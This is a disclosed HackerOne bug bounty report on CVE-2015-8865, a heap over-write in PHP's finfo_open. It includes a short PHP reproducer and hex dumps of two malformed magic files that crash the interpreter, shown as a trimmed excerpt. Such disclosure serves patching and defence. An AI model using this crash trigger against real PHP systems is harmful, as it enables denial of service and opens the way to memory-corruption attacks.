# [H] Buffer over-write in finfo_open with malformed magic file.

## Summary
Severity: High (CVSS 7.3)
Program: Internet Bug Bounty
Weakness: Heap Overflow
Reporter: haquaman
State: resolved
Disclosed: 2020-11-09T01:46:27.320Z
CVE: CVE-2015-8865
Source: https://hackerone.com/reports/476179

## Details
https://bugs.php.net/bug.php?id=71527

This bug causes a segfault when running with environment variable USE_ZEND_ALLOC set to 0, and also when compiled with ASAN with USE_ZEND_ALLOC set and unset.

To reproduce, run the following PHP file, with the example magic file below.

$ cat magic-open.php
<?php
$finfo = finfo_open(FILEINFO_NONE, $argv[1]);
$info = finfo_file($finfo, $argv[2]);
var_dump($info);
?>

Magic file is (used without ASAN):
$ xxd -g 1 magic.crash-noasan
0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e     >>>>>>>>>>>>>>>

$ cat magic.crash-noasan
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Magic file is (used with ASAN):
$ xxd -g 1 magic.crash-asan
0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e  >>>>>>>>>>>>>>>>
0000020: 71 3e 3e 3e 3e 3e 3e 3e 3e 0a 00                 q>>>>>>>>..

$ cat magic.crash-asan
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>q>>>>>>>>

Then run the program like:

./sapi/cli/php magic-open.php magic.crash /dev/null

You will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is UNSET (no crash).

$ ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null


_Trimmed to 38 lines — full report: https://hackerone.com/reports/476179_
